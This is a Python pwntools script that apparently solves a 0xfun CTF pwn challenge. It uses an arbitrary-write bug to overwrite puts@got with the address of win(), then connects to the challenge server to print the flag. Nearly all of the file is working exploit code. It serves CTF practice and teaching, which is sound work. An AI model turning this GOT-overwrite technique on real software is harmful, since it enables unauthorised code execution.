#!/usr/bin/env python3
"""
Exploit for "Show me what you GOT!" - 0xfun CTF

Vulnerability: Arbitrary Write (write-what-where)
The program reads two numbers and executes: mov [first_number], second_number

Strategy:
1. Overwrite puts@got with the address of win()
2. When main calls puts("Goodbye!"), it will execute win() instead
3. win() reads and displays flag.txt
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = 'chall.0xfun.org'
PORT = 24263

elf = ELF('./chall', checksec=False)

# Key addresses
win_addr = elf.symbols['win']
puts_got = elf.got['puts']

log.info(f"win() address: {hex(win_addr)}")
log.info(f"puts@got address: {hex(puts_got)}")

# Connect
p = remote(HOST, PORT)

# Receive prompt: "Show me what you GOT!"
p.recvuntil(b'!')

# First input: address to write to (puts@got)
# We overwrite puts@got because "Goodbye!" is printed with puts()
log.info(f"Sending puts@got address: {puts_got}")
p.sendline(str(puts_got).encode())

# Receive second prompt
p.recvuntil(b'!')

# Second input: value to write (win address)
log.info(f"Sending win() address: {win_addr}")
p.sendline(str(win_addr).encode())

# Receive the flag
log.success("Waiting for flag...")
resp = p.recvall(timeout=5)
print("\n" + resp.decode())

p.close()
